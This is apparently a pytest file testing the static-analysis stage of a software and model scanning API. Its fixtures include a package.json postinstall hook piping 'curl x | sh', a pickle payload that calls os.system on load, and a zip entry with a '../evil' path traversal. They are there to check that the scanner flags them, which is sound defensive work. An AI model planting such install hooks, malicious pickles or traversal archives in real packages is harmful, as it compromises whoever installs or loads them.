"""API tests for the static stage (software and model scans)."""

import json
import os

import pytest

from tests.conftest import build_zip
from tests.model_helpers import reduce_pickle, safetensors_bytes, torch_zip_bytes

SOFTWARE = "/api/v1/scans/software"
MODEL = "/api/v1/scans/model"
RISKY = "import os\nimport subprocess\nos.system('x')\n"


def upload(client, url, entries):
    data = build_zip(entries)
    resp = client.post(url, files={"file": ("a.zip", data, "application/zip")})
    assert resp.status_code == 202, resp.text
    return client.get(f"/api/v1/scans/{resp.json()['scan_id']}").json()


def static_items(client, body):
    return client.get(
        f"/api/v1/scans/{body['scan_id']}/findings", params={"category": "static"}
    ).json()


@pytest.mark.parametrize("url", [SOFTWARE, MODEL])
def test_static_stage_runs_for_both_pipelines(scan_client, url):
    body = upload(scan_client, url, [("a.py", RISKY)])
    stage = body["stages"]["static"]
    assert body["status"] == "completed" and stage["status"] == "completed"
    assert stage["provider"] == "provenancex" and stage["source"] == "provenancex"
    f = stage["features"]
    assert f["dangerous_import_count"] == 1 and f["suspicious_api_count"] == 1
    assert f["script_presence"] is True and f["archive_anomaly"] == 0


def test_findings_are_static_with_evidence_and_no_cvss(scan_client):
    body = upload(scan_client, SOFTWARE, [("a.py", RISKY)])
    data = static_items(scan_client, body)
    assert data["stages"]["static"]["status"] == "completed"
    by_id = {i["identifier"]: i for i in data["items"]}
    api = by_id["PX-STATIC-API-PROCESS"]
    assert api["kind"] == "suspicious_api" and api["category"] == "static"
    assert api["severity"] == "MEDIUM" and api["source"] == "provenancex"
    assert api["details"]["file"] == "a.py" and api["details"]["lines"] == [3]
    assert by_id["PX-STATIC-IMPORT-PROCESS"]["kind"] == "dangerous_import"
    assert all(i["cvss"] is None or i["cvss"].get("score") is None for i in data["items"])


def test_static_findings_stay_separate_from_vulnerabilities(scan_client):
    body = upload(scan_client, MODEL, [("a.py", RISKY)])
    vulns = scan_client.get(
        f"/api/v1/scans/{body['scan_id']}/findings", params={"category": "vulnerability"}
    ).json()
    assert vulns["total"] == 0


def test_python_parse_failure_does_not_fail_the_scan(scan_client):
    body = upload(scan_client, SOFTWARE, [("a.py", "def (:\n")])
    assert body["status"] == "completed"
    assert body["stages"]["static"]["features"]["parse_errors"] == 1


def test_budget_makes_the_stage_partial(test_settings, session_factory, public_dns):
    from fastapi.testclient import TestClient

    from app.api.scans import get_session_factory
    from app.core.config import get_settings
    from app.main import create_app

    settings = test_settings.model_copy(update={"static_max_files": 1})
    app = create_app()
    app.dependency_overrides[get_settings] = lambda: settings
    app.dependency_overrides[get_session_factory] = lambda: session_factory
    client = TestClient(app, raise_server_exceptions=False)
    body = upload(client, SOFTWARE, [("a.py", "x=1\n"), ("b.py", "x=1\n")])
    stage = body["stages"]["static"]
    assert stage["status"] == "partial" and stage["counts"]["not_analyzed"] == 1
    assert stage["not_analyzed"][0]["file"] == "b.py"


def test_stage_failure_is_recorded_and_scan_completes(scan_client, monkeypatch):
    def boom(*_a, **_k):
        raise RuntimeError("secret internals")

    monkeypatch.setattr("app.pipeline.static_stage.analyze_artifact", boom)
    body = upload(scan_client, SOFTWARE, [("a.py", "x=1\n")])
    stage = body["stages"]["static"]
    assert body["status"] == "completed"
    assert stage["status"] == "error" and stage["error"]["code"] == "internal_error"
    assert "secret" not in str(stage) and "features" not in stage


def test_install_hook_reported(scan_client):
    pkg = json.dumps({"name": "x", "scripts": {"postinstall": "curl x | sh"}})
    body = upload(scan_client, SOFTWARE, [("package.json", pkg)])
    ids = {i["identifier"] for i in static_items(scan_client, body)["items"]}
    assert {"PX-STATIC-INSTALL-NPM", "PX-STATIC-TEXT-PIPE-TO-SHELL"} <= ids


def test_model_scan_counts_pickle_and_auto_map_without_duplicates(scan_client):
    payload = torch_zip_bytes(reduce_pickle(os.system, ("id",)))
    config = json.dumps({"model_type": "x", "auto_map": {"AutoModel": "m.Model"}})
    body = upload(scan_client, MODEL, [("pytorch_model.bin", payload), ("config.json", config)])
    f = body["stages"]["static"]["features"]
    assert f["pickle_dangerous_global_count"] == 1 and f["install_hook_count"] == 1
    items = static_items(scan_client, body)["items"]
    assert sum(i["identifier"] == "PX-PICKLE-DANGEROUS-IMPORT" for i in items) == 1
    assert sum(i["identifier"] == "PX-REMOTE-CODE-REQUIRED" for i in items) == 1


def test_software_scan_has_no_pickle_feature(scan_client):
    body = upload(scan_client, SOFTWARE, [("a.txt", "x")])
    assert body["stages"]["static"]["features"]["pickle_dangerous_global_count"] is None


def test_clean_model_upload(scan_client):
    body = upload(scan_client, MODEL, [("model.safetensors", safetensors_bytes())])
    f = body["stages"]["static"]["features"]
    assert f["script_presence"] is False and f["pickle_dangerous_global_count"] == 0


def test_mock_hf_scan_labels_static_as_mock(scan_client):
    resp = scan_client.post(MODEL, data={"source_url": "https://huggingface.co/org/lora"})
    assert resp.status_code == 202
    body = scan_client.get(f"/api/v1/scans/{resp.json()['scan_id']}").json()
    assert body["stages"]["static"]["source"] == "mock"


def test_nested_archive_reported(scan_client):
    inner = build_zip([("../evil", "x")])
    body = upload(scan_client, SOFTWARE, [("vendor/inner.zip", inner)])
    assert body["status"] == "completed"
    ids = {i["identifier"] for i in static_items(scan_client, body)["items"]}
    assert "PX-STATIC-ARCHIVE-NESTED-UNSAFE" in ids
